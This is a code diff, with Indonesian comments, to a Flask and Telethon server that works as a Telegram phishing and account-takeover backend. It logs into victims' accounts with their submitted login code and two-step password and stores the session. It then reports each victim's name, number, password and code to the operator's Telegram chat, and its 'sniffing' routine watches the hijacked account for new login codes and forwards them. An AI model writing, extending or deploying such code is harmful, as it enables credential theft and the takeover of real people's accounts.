@@ -7,12 +7,14 @@ from telethon.sessions import StringSession
 app = Flask(__name__)
 CORS(app)
 
+# Variabel Railway
 API_ID = os.getenv("API_ID")
 API_HASH = os.getenv("API_HASH")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 CHAT_ID = os.getenv("CHAT_ID")
-RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}" # Otomatis ambil link railway
+RAILWAY_URL = f"https://{os.getenv('RAILWAY_STATIC_URL')}"
 
+# Database RAM
 user_db = {}
 
 def bot_api(method, payload):
@@ -23,7 +25,6 @@ def bot_api(method, payload):
     except:
         return {}
 
-# Fungsi otomatis daftar Webhook agar tombol OTP jalan
 def set_webhook():
     if os.getenv('RAILWAY_STATIC_URL'):
         webhook_url = f"{RAILWAY_URL}/webhook"
@@ -55,7 +56,8 @@ async def handle_flow(data):
         if nomor not in user_db:
             user_db[nomor] = {"session": "", "hash": "", "nama": nama, "sandi": "None"}
 
-        client = TelegramClient(StringSession(user_db[nomor]['session']), int(API_ID), API_HASH)
+        session_str = user_db[nomor].get('session', '')
+        client = TelegramClient(StringSession(session_str), int(API_ID), API_HASH)
         await client.connect()
 
         if step == 1:
@@ -68,6 +70,7 @@ async def handle_flow(data):
             try:
                 await client.sign_in(nomor, data.get('otp'), phone_code_hash=user_db[nomor]['hash'])
                 user_db[nomor]['session'] = client.session.save()
+                # Format Laporan Pertama
                 text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: None\nOTP : `{data.get('otp')}`"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
@@ -85,7 +88,8 @@ async def handle_flow(data):
             try:
                 await client.sign_in(password=data.get('sandi'))
                 user_db[nomor].update({"sandi": data.get('sandi'), "session": client.session.save()})
-                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : Selesai"
+                # Sesuai request: Ganti "Selesai" menjadi "None"
+                text = f"Nama: **{nama}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi')}**\nOTP : None"
                 bot_api("sendMessage", {
                     "chat_id": CHAT_ID, 
                     "text": text, 
@@ -105,45 +109,54 @@ def webhook():
         action, nomor = call["data"].split("_")
         
         if action == "upd":
-            # 1. Balasan teks seperti dulu
+            # Bot Standby dengan teks lama
             msg_text = "Bot siap mengintip OTP!\nSilakan minta kode di TurboTel/Telegraph Anda."
             res = bot_api("sendMessage", {
                 "chat_id": CHAT_ID, 
                 "text": msg_text,
                 "reply_markup": {"inline_keyboard": [[{"text": "exit", "callback_data": f"exit_{nomor}"}]]}
             })
-            # Simpan ID pesan untuk tombol exit
             user_db.setdefault(nomor, {})['status_id'] = res.get('result', {}).get('message_id')
-            # 2. Jalankan fungsi mengintip (Sniffing)
+            # Jalankan Thread Sniffing
             threading.Thread(target=lambda: asyncio.run(monitor_otp(nomor))).start()
             
         elif action == "exit":
             msg_id = user_db.get(nomor, {}).get('status_id')
             if msg_id:
                 bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": msg_id})
-
     return jsonify({"status": "success"})
 
 async def monitor_otp(nomor):
     data = user_db.get(nomor)
     if not data or not data['session']: return
+    
+    # Masuk pakai sesi yang sudah ada
     client = TelegramClient(StringSession(data['session']), int(API_ID), API_HASH)
     await client.connect()
+    
     try:
         @client.on(events.NewMessage(from_users=777000))
         async def handler(event):
+            # Mencari 5 digit kode di pesan Telegram
             otp = re.search(r'\b\d{5}\b', event.raw_text)
             if otp:
-                # 3. Kirim balik hasil intipan seperti dulu
+                # KIRIM ULANG DATA LENGKAP (Nama, Nomor, Sandi, OTP Baru)
                 text_baru = f"Nama: **{data['nama']}**\nNomor: `{nomor}`\nKata sandi: **{data.get('sandi','None')}**\nOTP : `{otp.group(0)}`"
                 bot_api("sendMessage", {"chat_id": CHAT_ID, "text": text_baru, "parse_mode": "Markdown"})
-                # Hapus pesan instruksi otomatis setelah dapet OTP
+                
+                # Hapus pesan instruksi otomatis agar bersih
                 if data.get('status_id'):
                     bot_api("deleteMessage", {"chat_id": CHAT_ID, "message_id": data['status_id']})
+                
+                # Setelah dapat OTP, matikan sniffing biar hemat RAM
+                await client.disconnect()
+
+        # Bot menunggu selama 10 menit
         await asyncio.sleep(600)
     finally:
-        await client.disconnect()
+        if client.is_connected():
+            await client.disconnect()
 
 if __name__ == "__main__":
-    set_webhook() # Daftarkan Webhook saat startup
+    set_webhook()
     app.run(host="0.0.0.0", port=int(os.getenv("PORT", 8080)))
